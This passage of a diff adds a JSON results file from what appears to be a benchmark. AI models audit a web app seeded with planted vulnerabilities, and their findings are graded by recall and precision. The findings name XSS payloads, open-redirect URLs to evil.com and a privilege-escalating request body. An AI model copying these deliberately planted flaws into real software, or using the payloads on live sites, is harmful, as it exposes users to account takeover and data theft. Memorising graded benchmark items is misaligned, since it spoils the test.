+                  "file": "src/lib/actions/meals.ts",
+                  "line": 171,
+                  "category": "authorization",
+                  "severity": "medium",
+                  "title": "Meal repetition reads another user's meal by ID",
+                  "evidence": "The source lookup filters only on `eq(meals.id, mealId)` at lines 169–173, not `meals.user_id = user.id`; the selected meal is then copied into the caller's account at lines 177–189. An authenticated attacker who obtains another meal ID can repeat it and disclose/copy that user's meal name, location, and nutritional data into their own account."
+                },
+                "planted": "V4"
+              }
+            ],
+            "duplicates": [],
+            "unmatched": [],
+            "recall": 0.5,
+            "precision": 1
+          }
+        },
+        {
+          "rep": 3,
+          "ok": true,
+          "findings": [
+            {
+              "file": "src/app/api/cron/maintenance/route.ts",
+              "line": 16,
+              "category": "authentication",
+              "severity": "high",
+              "title": "Maintenance endpoint is unauthenticated when CRON_SECRET is unset",
+              "evidence": "The authorization check only rejects requests inside `if (cronSecret && auth !== ...)`, so when `CRON_SECRET` is absent any remote attacker can `GET /api/cron/maintenance` and execute `expireStaleFacts`, `consolidateMemories`, and `pruneEvents`."
+            },
+            {
+              "file": "src/app/api/whoop/callback/route.ts",
+              "line": 21,
+              "category": "csrf",
+              "severity": "high",
+              "title": "OAuth callback accepts a missing state cookie, enabling account-linking CSRF",
+              "evidence": "The callback rejects a mismatch only when `expected` is truthy: `if (!code || (expected && state !== expected))`. An attacker can obtain a valid Whoop authorization `code` for their account and send the callback URL to a logged-in victim who has no state cookie, causing `connectWhoop(user.id, code)` to link the attacker's Whoop account to the victim."
+            },
+            {
+              "file": "src/app/api/whoop/connect/route.ts",
+              "line": 13,
+              "category": "open-redirect",
+              "severity": "low",
+              "title": "The Whoop connect endpoint redirects to an attacker-controlled URL",
+              "evidence": "When Whoop configuration is unavailable, `new URL(next ?? \"/settings?whoop=env\", request.url)` accepts an absolute attacker-supplied `next`; requesting `/api/whoop/connect?next=https://attacker.example` redirects the user to that external site."
+            },
+            {
+              "file": "src/lib/data/pushSubscriptions.ts",
+              "line": 46,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "Deleting a push subscription ignores its owning user",
+              "evidence": "`deleteSubscription(userId, endpoint)` never uses `userId` and deletes solely with `eq(push_subscriptions.endpoint, endpoint)`. An authenticated attacker who supplies another user's known push endpoint to `DELETE /api/push/subscribe` can remove that user's subscription and prevent their push notifications."
+            },
+            {
+              "file": "src/lib/actions/meals.ts",
+              "line": 172,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "Any authenticated user can copy another user's meal by ID",
+              "evidence": "`repeatMeal` selects the source using only `eq(meals.id, mealId)` and then inserts its name, place, and nutrition values under the caller's `user.id`. An authenticated attacker who obtains or guesses another meal ID can copy that user's private meal data into their own account."
+            },
+            {
+              "file": "src/lib/actions/profile.ts",
+              "line": 117,
+              "category": "mass-assignment",
+              "severity": "high",
+              "title": "Profile settings accepts arbitrary profile columns",
+              "evidence": "`settingsSchema` uses `.passthrough()` and the result is spread directly into `.set({ ...data, updated_at: ... })`; an attacker can submit a `user_id` field, which is a real profile column evidenced by the query predicate, and change the ownership of their profile row (or assign it to another account), corrupting profile access and data association."
+            }
+          ],
+          "seconds": 24.2,
+          "inputTokens": 10581,
+          "outputTokens": 1571,
+          "grade": {
+            "found": [
+              "V1",
+              "V2",
+              "V3",
+              "V4",
+              "V5",
+              "V8"
+            ],
+            "missed": [
+              "V6",
+              "V7"
+            ],
+            "matched": [
+              {
+                "finding": {
+                  "file": "src/app/api/cron/maintenance/route.ts",
+                  "line": 16,
+                  "category": "authentication",
+                  "severity": "high",
+                  "title": "Maintenance endpoint is unauthenticated when CRON_SECRET is unset",
+                  "evidence": "The authorization check only rejects requests inside `if (cronSecret && auth !== ...)`, so when `CRON_SECRET` is absent any remote attacker can `GET /api/cron/maintenance` and execute `expireStaleFacts`, `consolidateMemories`, and `pruneEvents`."
+                },
+                "planted": "V1"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/whoop/callback/route.ts",
+                  "line": 21,
+                  "category": "csrf",
+                  "severity": "high",
+                  "title": "OAuth callback accepts a missing state cookie, enabling account-linking CSRF",
+                  "evidence": "The callback rejects a mismatch only when `expected` is truthy: `if (!code || (expected && state !== expected))`. An attacker can obtain a valid Whoop authorization `code` for their account and send the callback URL to a logged-in victim who has no state cookie, causing `connectWhoop(user.id, code)` to link the attacker's Whoop account to the victim."
+                },
+                "planted": "V2"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/whoop/connect/route.ts",
+                  "line": 13,
+                  "category": "open-redirect",
+                  "severity": "low",
+                  "title": "The Whoop connect endpoint redirects to an attacker-controlled URL",
+                  "evidence": "When Whoop configuration is unavailable, `new URL(next ?? \"/settings?whoop=env\", request.url)` accepts an absolute attacker-supplied `next`; requesting `/api/whoop/connect?next=https://attacker.example` redirects the user to that external site."
+                },
+                "planted": "V8"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/data/pushSubscriptions.ts",
+                  "line": 46,
+                  "category": "authorization",
+                  "severity": "medium",
+                  "title": "Deleting a push subscription ignores its owning user",
+                  "evidence": "`deleteSubscription(userId, endpoint)` never uses `userId` and deletes solely with `eq(push_subscriptions.endpoint, endpoint)`. An authenticated attacker who supplies another user's known push endpoint to `DELETE /api/push/subscribe` can remove that user's subscription and prevent their push notifications."
+                },
+                "planted": "V3"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/actions/meals.ts",
+                  "line": 172,
+                  "category": "authorization",
+                  "severity": "medium",
+                  "title": "Any authenticated user can copy another user's meal by ID",
+                  "evidence": "`repeatMeal` selects the source using only `eq(meals.id, mealId)` and then inserts its name, place, and nutrition values under the caller's `user.id`. An authenticated attacker who obtains or guesses another meal ID can copy that user's private meal data into their own account."
+                },
+                "planted": "V4"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/actions/profile.ts",
+                  "line": 117,
+                  "category": "mass-assignment",
+                  "severity": "high",
+                  "title": "Profile settings accepts arbitrary profile columns",
+                  "evidence": "`settingsSchema` uses `.passthrough()` and the result is spread directly into `.set({ ...data, updated_at: ... })`; an attacker can submit a `user_id` field, which is a real profile column evidenced by the query predicate, and change the ownership of their profile row (or assign it to another account), corrupting profile access and data association."
+                },
+                "planted": "V5"
+              }
+            ],
+            "duplicates": [],
+            "unmatched": [],
+            "recall": 0.75,
+            "precision": 1
+          }
+        }
+      ]
+    },
+    {
+      "summary": {
+        "model": "explabs:nemotron-3-ultra-550b-a55b",
+        "reps": 3,
+        "completed": 3,
+        "errors": 0,
+        "meanRecall": 0.458,
+        "meanPrecision": 0.944,
+        "unmatchedFindings": 1,
+        "duplicateFindings": 0,
+        "foundPerPlant": {
+          "V1": 3,
+          "V2": 0,
+          "V3": 3,
+          "V4": 0,
+          "V5": 0,
+          "V6": 2,
+          "V7": 2,
+          "V8": 1
+        },
+        "foundInEveryRep": [
+          "V1",
+          "V3"
+        ],
+        "neverFound": [
+          "V2",
+          "V4",
+          "V5"
+        ],
+        "meanSecondsCompleted": 18.9
+      },
+      "reps": [
+        {
+          "rep": 1,
+          "ok": true,
+          "findings": [
+            {
+              "file": "src/app/api/cron/maintenance/route.ts",
+              "line": 14,
+              "category": "authentication",
+              "severity": "high",
+              "title": "Cron endpoint lacks authentication when CRON_SECRET is unset",
+              "evidence": "Line 14-18: The check `cronSecret && auth !== {cronSecret}` short-circuits if CRON_SECRET is not set, allowing unauthenticated access. An attacker sends GET /api/cron/maintenance without Authorization header and triggers maintenance tasks (consolidateMemories, expireStaleFacts, pruneEvents)."
+            },
+            {
+              "file": "src/lib/data/pushSubscriptions.ts",
+              "line": 43,
+              "category": "authorization",
+              "severity": "high",
+              "title": "deleteSubscription missing user_id filter allows cross-user deletion",
+              "evidence": "Line 43-47: deleteSubscription only filters by endpoint, not user_id. An authenticated attacker calls DELETE /api/push/subscribe with another user's push endpoint (obtained via side-channel or guess) and deletes that user's subscription."
+            },
+            {
+              "file": "src/lib/actions/aiSettings.ts",
+              "line": 203,
+              "category": "secret-exposure",
+              "severity": "medium",
+              "title": "storedAiKeyAction returns plaintext API key to client",
+              "evidence": "Line 203-210: storedAiKeyAction returns the full API key in the response body. An authenticated user (or XSS attacker) calls this action and receives the plaintext key for any configured provider, enabling key theft if the frontend logs or exposes the response."
+            }
+          ],
+          "seconds": 13.6,
+          "inputTokens": 12271,
+          "outputTokens": 1343,
+          "grade": {
+            "found": [
+              "V1",
+              "V3",
+              "V6"
+            ],
+            "missed": [
+              "V2",
+              "V4",
+              "V5",
+              "V7",
+              "V8"
+            ],
+            "matched": [
+              {
+                "finding": {
+                  "file": "src/app/api/cron/maintenance/route.ts",
+                  "line": 14,
+                  "category": "authentication",
+                  "severity": "high",
+                  "title": "Cron endpoint lacks authentication when CRON_SECRET is unset",
+                  "evidence": "Line 14-18: The check `cronSecret && auth !== {cronSecret}` short-circuits if CRON_SECRET is not set, allowing unauthenticated access. An attacker sends GET /api/cron/maintenance without Authorization header and triggers maintenance tasks (consolidateMemories, expireStaleFacts, pruneEvents)."
+                },
+                "planted": "V1"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/data/pushSubscriptions.ts",
+                  "line": 43,
+                  "category": "authorization",
+                  "severity": "high",
+                  "title": "deleteSubscription missing user_id filter allows cross-user deletion",
+                  "evidence": "Line 43-47: deleteSubscription only filters by endpoint, not user_id. An authenticated attacker calls DELETE /api/push/subscribe with another user's push endpoint (obtained via side-channel or guess) and deletes that user's subscription."
+                },
+                "planted": "V3"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/actions/aiSettings.ts",
+                  "line": 203,
+                  "category": "secret-exposure",
+                  "severity": "medium",
+                  "title": "storedAiKeyAction returns plaintext API key to client",
+                  "evidence": "Line 203-210: storedAiKeyAction returns the full API key in the response body. An authenticated user (or XSS attacker) calls this action and receives the plaintext key for any configured provider, enabling key theft if the frontend logs or exposes the response."
+                },
+                "planted": "V6"
+              }
+            ],
+            "duplicates": [],
+            "unmatched": [],
+            "recall": 0.375,
+            "precision": 1
+          }
+        },
+        {
+          "rep": 2,
+          "ok": true,
+          "findings": [
+            {
+              "file": "src/app/api/cron/maintenance/route.ts",
+              "line": 14,
+              "category": "authentication",
+              "severity": "high",
+              "title": "Cron endpoint bypasses authentication when CRON_SECRET is not configured",
+              "evidence": "Line 14-18: const cronSecret = process.env.CRON_SECRET; if (cronSecret && auth !== `Bearer ${cronSecret}`) returns 401. If CRON_SECRET is unset (undefined) or empty string, the condition short-circuits to false and the auth check is skipped entirely. Attacker: unauthenticated internet user. Input: GET /api/cron/maintenance without Authorization header. Impact: Unauthorized execution of maintenance tasks (expireStaleFacts, consolidateMemories, pruneEvents)."
+            },
+            {
+              "file": "src/lib/data/pushSubscriptions.ts",
+              "line": 39,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "deleteSubscription ignores userId parameter allowing cross-user deletion",
+              "evidence": "Line 39-48: deleteSubscription(userId, endpoint) deletes by endpoint only (where eq(push_subscriptions.endpoint, endpoint)), ignoring userId. The API route at src/app/api/push/subscribe/route.ts line 60 calls deleteSubscription(user.id, endpoint). Attacker: authenticated user who knows another user's push endpoint URL. Input: DELETE /api/push/subscribe with body {\"endpoint\": \"https://fcm.googleapis.com/...victim-endpoint...\"}. Impact: Deletes victim's push subscription (IDOR)."
+            },
+            {
+              "file": "src/components/ui/Markdown.tsx",
+              "line": 2,
+              "category": "xss",
+              "severity": "high",
+              "title": "rehypeRaw allows raw HTML rendering leading to XSS if user content reaches this component",
+              "evidence": "Line 2, 53: import rehypeRaw from 'rehype-raw'; rehypePlugins={[rehypeRaw]}. rehypeRaw passes raw HTML through the markdown parser. If the 'text' prop originates from user input (e.g., chat messages, coach replies, meal notes), an attacker can inject <img src=x onerror=alert(1)> or <script>alert(1)</script>. Attacker: any user who can supply content rendered by this component. Input: Markdown string containing raw HTML/JS. Impact: Stored or reflected XSS in victim's browser."
+            }
+          ],
+          "seconds": 18.4,
+          "inputTokens": 12271,
+          "outputTokens": 2006,
+          "grade": {
+            "found": [
+              "V1",
+              "V3",
+              "V7"
+            ],
+            "missed": [
+              "V2",
+              "V4",
+              "V5",
+              "V6",
+              "V8"
+            ],
+            "matched": [
+              {
+                "finding": {
+                  "file": "src/app/api/cron/maintenance/route.ts",
+                  "line": 14,
+                  "category": "authentication",
+                  "severity": "high",
+                  "title": "Cron endpoint bypasses authentication when CRON_SECRET is not configured",
+                  "evidence": "Line 14-18: const cronSecret = process.env.CRON_SECRET; if (cronSecret && auth !== `Bearer ${cronSecret}`) returns 401. If CRON_SECRET is unset (undefined) or empty string, the condition short-circuits to false and the auth check is skipped entirely. Attacker: unauthenticated internet user. Input: GET /api/cron/maintenance without Authorization header. Impact: Unauthorized execution of maintenance tasks (expireStaleFacts, consolidateMemories, pruneEvents)."
+                },
+                "planted": "V1"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/data/pushSubscriptions.ts",
+                  "line": 39,
+                  "category": "authorization",
+                  "severity": "medium",
+                  "title": "deleteSubscription ignores userId parameter allowing cross-user deletion",
+                  "evidence": "Line 39-48: deleteSubscription(userId, endpoint) deletes by endpoint only (where eq(push_subscriptions.endpoint, endpoint)), ignoring userId. The API route at src/app/api/push/subscribe/route.ts line 60 calls deleteSubscription(user.id, endpoint). Attacker: authenticated user who knows another user's push endpoint URL. Input: DELETE /api/push/subscribe with body {\"endpoint\": \"https://fcm.googleapis.com/...victim-endpoint...\"}. Impact: Deletes victim's push subscription (IDOR)."
+                },
+                "planted": "V3"
+              },
+              {
+                "finding": {
+                  "file": "src/components/ui/Markdown.tsx",
+                  "line": 2,
+                  "category": "xss",
+                  "severity": "high",
+                  "title": "rehypeRaw allows raw HTML rendering leading to XSS if user content reaches this component",
+                  "evidence": "Line 2, 53: import rehypeRaw from 'rehype-raw'; rehypePlugins={[rehypeRaw]}. rehypeRaw passes raw HTML through the markdown parser. If the 'text' prop originates from user input (e.g., chat messages, coach replies, meal notes), an attacker can inject <img src=x onerror=alert(1)> or <script>alert(1)</script>. Attacker: any user who can supply content rendered by this component. Input: Markdown string containing raw HTML/JS. Impact: Stored or reflected XSS in victim's browser."
+                },
+                "planted": "V7"
+              }
+            ],
+            "duplicates": [],
+            "unmatched": [],
+            "recall": 0.375,
+            "precision": 1
+          }
+        },
+        {
+          "rep": 3,
+          "ok": true,
+          "findings": [
+            {
+              "file": "src/app/api/cron/maintenance/route.ts",
+              "line": 14,
+              "category": "authentication",
+              "severity": "high",
+              "title": "Cron endpoint lacks authentication when CRON_SECRET is unset",
+              "evidence": "Line 14-18: `const cronSecret = process.env.CRON_SECRET; const auth = req.headers.get('authorization'); if (cronSecret && auth !== `Bearer ${cronSecret}`)` — if CRON_SECRET is not set, `cronSecret` is falsy and the entire condition short-circuits, allowing unauthenticated callers to trigger maintenance tasks (expire facts, consolidate memories, prune events)."
+            },
+            {
+              "file": "src/lib/data/pushSubscriptions.ts",
+              "line": 39,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "deleteSubscription ignores userId allowing cross-user deletion",
+              "evidence": "Line 39-47: `deleteSubscription(userId, endpoint)` accepts userId but the where clause only filters by `eq(push_subscriptions.endpoint, endpoint)`. An authenticated attacker who knows another user's push endpoint (e.g., via log leakage or guessable FCM URLs) can call DELETE /api/push/subscribe with that endpoint and delete the victim's subscription."
+            },
+            {
+              "file": "src/lib/data/pushSubscriptions.ts",
+              "line": 50,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "deleteSubscriptionByEndpoint lacks userId check",
+              "evidence": "Line 50-56: `deleteSubscriptionByEndpoint(endpoint)` deletes by endpoint only with no user scoping. Same cross-user deletion impact as deleteSubscription."
+            },
+            {
+              "file": "src/app/api/whoop/connect/route.ts",
+              "line": 12,
+              "category": "open-redirect",
+              "severity": "medium",
+              "title": "Open redirect via 'next' parameter when Whoop env missing",
+              "evidence": "Line 12-13: `const next = new URL(request.url).searchParams.get('next'); return NextResponse.redirect(new URL(next ?? '/settings?whoop=env', request.url))` — when `hasWhoopEnv()` is false, an attacker can supply `?next=https://evil.com` and the user will be redirected to the attacker's site after the OAuth flow (or immediately if env missing)."
+            },
+            {
+              "file": "src/lib/actions/aiSettings.ts",
+              "line": 203,
+              "category": "secret-exposure",
+              "severity": "low",
+              "title": "storedAiKeyAction returns plaintext API key to client",
+              "evidence": "Line 203-210: `storedAiKeyAction` calls `providerApiKey(user.id, parsed.data)` and returns `{ apiKey }` directly. The full API key (OpenRouter, Groq, Google, etc.) is exposed in the server action response, increasing risk of leakage via logs, XSS, or accidental exposure."
+            },
+            {
+              "file": "src/components/ui/Markdown.tsx",
+              "line": 53,
+              "category": "xss",
+              "severity": "medium",
+              "title": "rehypeRaw allows raw HTML rendering enabling XSS if untrusted input used",
+              "evidence": "Line 53: `rehypePlugins={[rehypeRaw]}` enables raw HTML passthrough in ReactMarkdown. If this component renders user-controlled content (coach replies, notes, etc.), an attacker who can inject markdown/HTML (e.g., via prompt injection or stored data) achieves client-side XSS."
+            }
+          ],
+          "seconds": 24.7,
+          "inputTokens": 12271,
+          "outputTokens": 2689,
+          "grade": {
+            "found": [
+              "V1",
+              "V3",
+              "V6",
+              "V7",
+              "V8"
+            ],
+            "missed": [
+              "V2",
+              "V4",
+              "V5"
+            ],
+            "matched": [
+              {
+                "finding": {
+                  "file": "src/app/api/cron/maintenance/route.ts",
+                  "line": 14,
+                  "category": "authentication",
+                  "severity": "high",
+                  "title": "Cron endpoint lacks authentication when CRON_SECRET is unset",
+                  "evidence": "Line 14-18: `const cronSecret = process.env.CRON_SECRET; const auth = req.headers.get('authorization'); if (cronSecret && auth !== `Bearer ${cronSecret}`)` — if CRON_SECRET is not set, `cronSecret` is falsy and the entire condition short-circuits, allowing unauthenticated callers to trigger maintenance tasks (expire facts, consolidate memories, prune events)."
+                },
+                "planted": "V1"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/data/pushSubscriptions.ts",
+                  "line": 39,
+                  "category": "authorization",
+                  "severity": "medium",
+                  "title": "deleteSubscription ignores userId allowing cross-user deletion",
+                  "evidence": "Line 39-47: `deleteSubscription(userId, endpoint)` accepts userId but the where clause only filters by `eq(push_subscriptions.endpoint, endpoint)`. An authenticated attacker who knows another user's push endpoint (e.g., via log leakage or guessable FCM URLs) can call DELETE /api/push/subscribe with that endpoint and delete the victim's subscription."
+                },
+                "planted": "V3"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/whoop/connect/route.ts",
+                  "line": 12,
+                  "category": "open-redirect",
+                  "severity": "medium",
+                  "title": "Open redirect via 'next' parameter when Whoop env missing",
+                  "evidence": "Line 12-13: `const next = new URL(request.url).searchParams.get('next'); return NextResponse.redirect(new URL(next ?? '/settings?whoop=env', request.url))` — when `hasWhoopEnv()` is false, an attacker can supply `?next=https://evil.com` and the user will be redirected to the attacker's site after the OAuth flow (or immediately if env missing)."
+                },
+                "planted": "V8"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/actions/aiSettings.ts",
+                  "line": 203,
+                  "category": "secret-exposure",
+                  "severity": "low",
+                  "title": "storedAiKeyAction returns plaintext API key to client",
+                  "evidence": "Line 203-210: `storedAiKeyAction` calls `providerApiKey(user.id, parsed.data)` and returns `{ apiKey }` directly. The full API key (OpenRouter, Groq, Google, etc.) is exposed in the server action response, increasing risk of leakage via logs, XSS, or accidental exposure."
+                },
+                "planted": "V6"
+              },
+              {
+                "finding": {
+                  "file": "src/components/ui/Markdown.tsx",
+                  "line": 53,
+                  "category": "xss",
+                  "severity": "medium",
+                  "title": "rehypeRaw allows raw HTML rendering enabling XSS if untrusted input used",
+                  "evidence": "Line 53: `rehypePlugins={[rehypeRaw]}` enables raw HTML passthrough in ReactMarkdown. If this component renders user-controlled content (coach replies, notes, etc.), an attacker who can inject markdown/HTML (e.g., via prompt injection or stored data) achieves client-side XSS."
+                },
+                "planted": "V7"
+              }
+            ],
+            "duplicates": [],
+            "unmatched": [
+              {
+                "file": "src/lib/data/pushSubscriptions.ts",
+                "line": 50,
+                "category": "authorization",
+                "severity": "medium",
+                "title": "deleteSubscriptionByEndpoint lacks userId check",
+                "evidence": "Line 50-56: `deleteSubscriptionByEndpoint(endpoint)` deletes by endpoint only with no user scoping. Same cross-user deletion impact as deleteSubscription."
+              }
+            ],
+            "recall": 0.625,
+            "precision": 0.8333333333333334
+          }
+        }
+      ]
+    },
+    {
+      "summary": {
+        "model": "explabs:mimo-v2.5-pro",
+        "reps": 3,
+        "completed": 3,
+        "errors": 0,
+        "meanRecall": 0.708,
+        "meanPrecision": 0.952,
+        "unmatchedFindings": 1,
+        "duplicateFindings": 0,
+        "foundPerPlant": {
+          "V1": 2,
+          "V2": 3,
+          "V3": 3,
+          "V4": 2,
+          "V5": 2,
+          "V6": 0,
+          "V7": 2,
+          "V8": 3
+        },
+        "foundInEveryRep": [
+          "V2",
+          "V3",
+          "V8"
+        ],
+        "neverFound": [
+          "V6"
+        ],
+        "meanSecondsCompleted": 80.233
+      },
+      "reps": [
+        {
+          "rep": 1,
+          "ok": true,
+          "findings": [
+            {
+              "file": "src/app/api/whoop/connect/route.ts",
+              "line": 12,
+              "category": "open-redirect",
+              "severity": "medium",
+              "title": "Open redirect via unsanitized `next` query parameter",
+              "evidence": "Line 12-13: `const next = new URL(request.url).searchParams.get('next'); return NextResponse.redirect(new URL(next ?? '/settings?whoop=env', request.url));` — An attacker can craft a link like `/api/whoop/connect?next=https://evil.com` which redirects the authenticated user to an attacker-controlled site after OAuth initiation, enabling phishing."
+            },
+            {
+              "file": "src/app/api/whoop/callback/route.ts",
+              "line": 21,
+              "category": "csrf",
+              "severity": "high",
+              "title": "OAuth state CSRF bypass when cookie is missing",
+              "evidence": "Line 21: `if (!code || (expected && state !== expected))` — If the `whoop_oauth_state` cookie is absent (expired, stripped, or never set), `expected` is falsy so the entire state check short-circuits to `false`. An attacker can initiate their own Whoop OAuth flow, obtain an authorization `code`, then trick a victim into visiting `/api/whoop/callback?code=<attacker_code>` to link the attacker's Whoop account to the victim's profile."
+            },
+            {
+              "file": "src/lib/data/pushSubscriptions.ts",
+              "line": 44,
+              "category": "authorization",
+              "severity": "high",
+              "title": "deleteSubscription ignores userId, any user can delete anyone's push subscription",
+              "evidence": "Lines 44-47: the WHERE clause is only `eq(push_subscriptions.endpoint, endpoint)` — the `userId` parameter is accepted but never used in the query. An authenticated user who knows or guesses another user's push subscription endpoint can delete it via the DELETE `/api/push/subscribe` endpoint."
+            },
+            {
+              "file": "src/lib/actions/meals.ts",
+              "line": 172,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "repeatMeal IDOR leaks other users' meal data",
+              "evidence": "Lines 169-174: `const source = await db.select().from(meals).where(eq(meals.id, mealId)).limit(1);` — No `user_id` filter. Any authenticated user can supply another user's `mealId` to `repeatMeal` and the source meal's name, place, macros, and fat quality are copied into their own account, leaking the victim's dietary data."
+            },
+            {
+              "file": "src/app/api/cron/maintenance/route.ts",
+              "line": 16,
+              "category": "authentication",
+              "severity": "medium",
+              "title": "Cron endpoint is unauthenticated when CRON_SECRET env var is unset",
+              "evidence": "Line 16: `if (cronSecret && auth !== ...)` — The guard is skipped entirely when `CRON_SECRET` is not configured. Any unauthenticated user can trigger `expireStaleFacts`, `consolidateMemories`, and `pruneEvents` by hitting the GET endpoint."
+            },
+            {
+              "file": "src/components/ui/Markdown.tsx",
+              "line": 53,
+              "category": "xss",
+              "severity": "medium",
+              "title": "rehype-raw enables raw HTML injection in rendered Markdown",
+              "evidence": "Lines 52-53: `rehypePlugins={[rehypeRaw]}` combined with the `a` component on line 33 passing `href` through without sanitization (`<a href={href} ...>`). An attacker who controls the `text` prop can inject `<a href=\"javascript:alert(document.cookie)\">click me</a>` which renders as a live `javascript:` link. If this component renders any user- or AI-generated content, it is exploitable."
+            }
+          ],
+          "seconds": 54.7,
+          "inputTokens": 11857,
+          "outputTokens": 2466,
+          "grade": {
+            "found": [
+              "V1",
+              "V2",
+              "V3",
+              "V4",
+              "V7",
+              "V8"
+            ],
+            "missed": [
+              "V5",
+              "V6"
+            ],
+            "matched": [
+              {
+                "finding": {
+                  "file": "src/app/api/whoop/connect/route.ts",
+                  "line": 12,
+                  "category": "open-redirect",
+                  "severity": "medium",
+                  "title": "Open redirect via unsanitized `next` query parameter",
+                  "evidence": "Line 12-13: `const next = new URL(request.url).searchParams.get('next'); return NextResponse.redirect(new URL(next ?? '/settings?whoop=env', request.url));` — An attacker can craft a link like `/api/whoop/connect?next=https://evil.com` which redirects the authenticated user to an attacker-controlled site after OAuth initiation, enabling phishing."
+                },
+                "planted": "V8"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/whoop/callback/route.ts",
+                  "line": 21,
+                  "category": "csrf",
+                  "severity": "high",
+                  "title": "OAuth state CSRF bypass when cookie is missing",
+                  "evidence": "Line 21: `if (!code || (expected && state !== expected))` — If the `whoop_oauth_state` cookie is absent (expired, stripped, or never set), `expected` is falsy so the entire state check short-circuits to `false`. An attacker can initiate their own Whoop OAuth flow, obtain an authorization `code`, then trick a victim into visiting `/api/whoop/callback?code=<attacker_code>` to link the attacker's Whoop account to the victim's profile."
+                },
+                "planted": "V2"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/data/pushSubscriptions.ts",
+                  "line": 44,
+                  "category": "authorization",
+                  "severity": "high",
+                  "title": "deleteSubscription ignores userId, any user can delete anyone's push subscription",
+                  "evidence": "Lines 44-47: the WHERE clause is only `eq(push_subscriptions.endpoint, endpoint)` — the `userId` parameter is accepted but never used in the query. An authenticated user who knows or guesses another user's push subscription endpoint can delete it via the DELETE `/api/push/subscribe` endpoint."
+                },
+                "planted": "V3"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/actions/meals.ts",
+                  "line": 172,
+                  "category": "authorization",
+                  "severity": "medium",
+                  "title": "repeatMeal IDOR leaks other users' meal data",
+                  "evidence": "Lines 169-174: `const source = await db.select().from(meals).where(eq(meals.id, mealId)).limit(1);` — No `user_id` filter. Any authenticated user can supply another user's `mealId` to `repeatMeal` and the source meal's name, place, macros, and fat quality are copied into their own account, leaking the victim's dietary data."
+                },
+                "planted": "V4"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/cron/maintenance/route.ts",
+                  "line": 16,
+                  "category": "authentication",
+                  "severity": "medium",
+                  "title": "Cron endpoint is unauthenticated when CRON_SECRET env var is unset",
+                  "evidence": "Line 16: `if (cronSecret && auth !== ...)` — The guard is skipped entirely when `CRON_SECRET` is not configured. Any unauthenticated user can trigger `expireStaleFacts`, `consolidateMemories`, and `pruneEvents` by hitting the GET endpoint."
+                },
+                "planted": "V1"
+              },
+              {
+                "finding": {
+                  "file": "src/components/ui/Markdown.tsx",
+                  "line": 53,
+                  "category": "xss",
+                  "severity": "medium",
+                  "title": "rehype-raw enables raw HTML injection in rendered Markdown",
+                  "evidence": "Lines 52-53: `rehypePlugins={[rehypeRaw]}` combined with the `a` component on line 33 passing `href` through without sanitization (`<a href={href} ...>`). An attacker who controls the `text` prop can inject `<a href=\"javascript:alert(document.cookie)\">click me</a>` which renders as a live `javascript:` link. If this component renders any user- or AI-generated content, it is exploitable."
+                },
+                "planted": "V7"
+              }
+            ],
+            "duplicates": [],
+            "unmatched": [],
+            "recall": 0.75,
+            "precision": 1
+          }
+        },
+        {
+          "rep": 2,
+          "ok": true,
+          "findings": [
+            {
+              "file": "src/lib/actions/profile.ts",
+              "line": 109,
+              "category": "mass-assignment",
+              "severity": "high",
+              "title": "Mass assignment via .passthrough() spreads arbitrary fields into DB update",
+              "evidence": "The settingsSchema uses `.passthrough()` (line 109), so any extra keys survive parsing. Then line 117 does `.set({ ...data, updated_at: new Date() })`, writing every field from the input—including attacker-supplied columns like `is_admin` or `role`—into the profiles row. An authenticated user can send `{\"sex\":\"male\",\"birth_year\":1990,\"height_cm\":180,\"timezone\":\"UTC\",\"day_cutoff_hour\":0,\"is_admin\":true}` to escalate privileges."
+            },
+            {
+              "file": "src/app/api/whoop/connect/route.ts",
+              "line": 13,
+              "category": "open-redirect",
+              "severity": "high",
+              "title": "Open redirect via unvalidated `next` query parameter",
+              "evidence": "Line 12 reads `next` from the query string and line 13 passes it directly to `new URL(next ?? \"/settings?whoop=env\", request.url)`. When `next` is an absolute URL like `https://evil.com`, the redirect goes to the attacker's site. An attacker sends a victim the link `/api/whoop/connect?next=https://evil.com/phish` and the victim is redirected after authentication, enabling phishing."
+            },
+            {
+              "file": "src/lib/data/pushSubscriptions.ts",
+              "line": 46,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "deleteSubscription ignores userId, any user can delete others' subscriptions",
+              "evidence": "The function accepts `userId` as a parameter (line 40) but the WHERE clause on line 46 only filters by `endpoint`, not `user_id`. An authenticated user who knows or can enumerate another user's push subscription endpoint can delete it by calling the DELETE action with that endpoint, silencing push notifications for the victim."
+            },
+            {
+              "file": "src/app/api/whoop/callback/route.ts",
+              "line": 21,
+              "category": "csrf",
+              "severity": "medium",
+              "title": "OAuth state CSRF check silently skipped when cookie is missing",
+              "evidence": "Line 21: `if (!code || (expected && state !== expected))` — when the `whoop_oauth_state` cookie is absent (expired, blocked, or cleared), `expected` is undefined and the entire state comparison is skipped regardless of the `state` parameter value. An attacker can obtain a valid Whoop authorization code, then navigate the victim's browser to `/api/whoop/callback?code=<attacker_code>&state=x` to link the attacker's Whoop account to the victim's account, bypassing CSRF protection on the OAuth callback."
+            },
+            {
+              "file": "src/components/ui/Markdown.tsx",
+              "line": 53,
+              "category": "xss",
+              "severity": "medium",
+              "title": "rehype-raw allows arbitrary HTML injection including javascript: URLs",
